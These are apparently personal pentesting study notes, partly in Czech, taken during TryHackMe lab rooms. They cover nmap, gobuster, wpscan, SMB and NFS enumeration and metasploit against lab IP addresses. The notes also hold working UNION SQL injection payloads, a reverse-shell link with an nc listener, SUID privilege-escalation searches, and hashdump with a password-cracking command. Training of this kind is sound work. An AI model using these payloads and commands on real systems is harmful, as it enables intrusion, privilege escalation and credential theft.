### poznamky

## web

### nmap (nmap -help)
* **-sn**: Ping Scan
* **-sV**: Pokusí se určit verzi spuštěných služeb (Attempts to determine the version of the services running)
* **-p <x>**: Skenování portu <x> nebo všech portů
* **-Pn**: Zakáže zjišťování hostitele a skenuje otevřené porty
* **-A**: Povolí detekci OS a verze, spustí vestavěné skripty pro další enumeraci
* **-sC**: Skenování s výchozími Nmap skripty
* **-v**: Verbose mód (podrobný výpis)
* **-sU**: UDP port scan
* **-sS**: TCP SYN port scan

`nmap -sV -sC --script vuln 10.112.145.155`

`sudo nmap -sS -p- --min-rate 5000 10.64.179.64`
`sudo nmap -sC -sV -p80,443,3333 --min-rate 5000 10.64.179.64`

### gobuster
`gobuster dir -u http://10.67.153.62:3333/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`
-e	Print the full URLs in your console
-u	The target URL
-w	Path to your wordlist
-U and -P	Username and Password for Basic Auth
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth

### burpsite
#### proxy
- nastav proxy na firefoxu, host: localhost, port: 8080
- intercept a muzes menit payload
- muzes forwardnout do Intruder, Repeater a tak

#### introdur

#### reverse shell
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
`nc -lvnp 1234` 


#### SUID binaries (executed with root privileges)
`find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null`


#### burpsite


#### SQL injection
Retrieve database version:

1 UNION ALL SELECT NULL,version()--

Retrieve database names:

1 UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--

Retrieve table names:

1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'--

Retrieve column names:

1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'--

Retrieve data:

1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1--

Retrieve data from another database:

1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM database2.table1--

#### wordpress

`wpscan --url http://10.114.185.253/wordpress/ --enumerate u`


## TryHackMe "All in One"
The creator utilizes a classic pentesting toolkit:

    Nmap: For port scanning and service version detection.

    Gobuster: For directory brute-forcing to find the WordPress path.

    WPScan: Specifically for enumerating WordPress users and vulnerable plugins.

    Searchsploit / Google: To find the CVE-2016-10956 exploit for the Mail Masta plugin.

    Python: To run script about vulnerability mail-masta.

    https://github.com/wetw0rk/malicious-wordpress-plugin: A specific tool used to generate a malicious WordPress plugin for a shell.

## meterpreter
https://tryhackme.com/room/meterpreter
 - dostanu normalni shell
  shell 
  /bin/bash
  /bin/bash -i
  python3 -c 'import pty; pty.spawn("/bin/bash")' // kdyz se bash zacne divne chovat

hashdump (tu jsou useri, hesla) johnthe ripper pro cracinkg
`john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt` 


## https://gtfobins.org
- tootlka ktera umi najit jak obejit prava v masine

najde skripty ktere se spousteni s root pravama
`find / -perm -u=s -type f 2>/dev/null`


## samba
`enum4linux -a -U 10.114.165.59`
-U             get userlist
-M             get machine list
-N             get namelist dump (different from -U and-M)
-S             get sharelist
-P             get password policy information
-G             get group and member list

-a             all of the above (full basic enumeration)

`smbclient //10.10.10.10/secrets -U Anonymous -p 445`


## NFS
`sudo apt install nfs-common`

ukaze list NFS shares
`/usr/sbin/showmount -e 10.112.135.163`

mount disk (mozna to da error ale zkontroluj mountnuti)
`sudo mount -t nfs 10.112.135.163:/home /tmp/mount/ -nolock`

pokud to budes delat tak: https://tryhackme.com/room/networkservices2


## metasploit (priklad na SMTP)
`msfconsole`
`search smtp_version`
`use auxiliary/scanner/smtp/smtp_version nebo smtp_enum`
`show options`
`set RHOSTS 10.112.135.163`
`explot`

## mysql
pokud to budes delat tak: https://tryhackme.com/room/networkservices2


